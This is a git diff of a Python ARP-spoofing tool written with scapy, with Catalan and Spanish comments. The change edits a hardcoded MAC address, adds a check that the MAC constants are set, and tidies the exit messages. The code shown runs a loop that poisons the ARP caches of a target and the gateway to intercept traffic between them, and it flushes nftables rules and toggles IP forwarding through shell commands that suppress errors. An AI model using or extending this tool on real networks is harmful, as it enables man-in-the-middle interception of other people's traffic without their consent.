@@ -9,17 +9,18 @@ import scapy.all as scapy
 from colorama import Fore
 from myUtils import show_message
 from argparse import RawDescriptionHelpFormatter
+from myUtils import show_message
 
 ### Variables & Constants #################################################################################################
 
 SRC_IP = ""
-SRC_MAC = "aa:bb:cc:44:55:66"
+SRC_MAC = "aa:bb:cc:11:22:33"
 DST_MAC = "d4:d8:53:23:57:cb"
 
 ### Functions #############################################################################################################
 
 def def_handler(sig, frame):
-    print(f"\n{Fore.RED}[!] {Fore.YELLOW} Saliendo del programa...\n")
+    show_message("Exiting the program...", "error")
     disable_rules()
     sys.exit(1)
 
@@ -48,12 +49,14 @@ def spoof(ip_address, spoof_ip):
 def command_execute(command):
     try:
         result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
     except:
         pass
 
 def disable_rules():
     # Borra les regles de nftables
     command_execute("nft flush ruleset")
+    
     # Deshabilita l'encaminament
     # Si el vols tenir activat sempre comenta les linies que fan referencia a l'encaminament
     command_execute("sysctl -w net.ipv4.ip_forward=0")
@@ -70,17 +73,21 @@ def init():
 def main():
     
     try:
+        if not SRC_MAC or not DST_MAC:
+            show_message("Please, add the source MAC ")
 
-        init()
-        arguments = get_arguments()
-        SRC_IP = get_gateway()
-        print(SRC_IP)
 
-        # Per sortir del bucle es surt amb Ctrl + C
-        while True: 
-            spoof(arguments.target, SRC_IP)
-            spoof(SRC_IP, arguments.target)
-    
+        else:    
+            init()
+            arguments = get_arguments()
+            SRC_IP = get_gateway()
+            print(SRC_IP)
+
+            # Per sortir del bucle es surt amb Ctrl + C
+            while True: 
+                spoof(arguments.target, SRC_IP)
+                spoof(SRC_IP, arguments.target)
+        
     except PermissionError:
          print(f"{Fore.RED}[!] {Fore.YELLOW}You need to be SuperUser to perform this script")
          sys.exit(1)
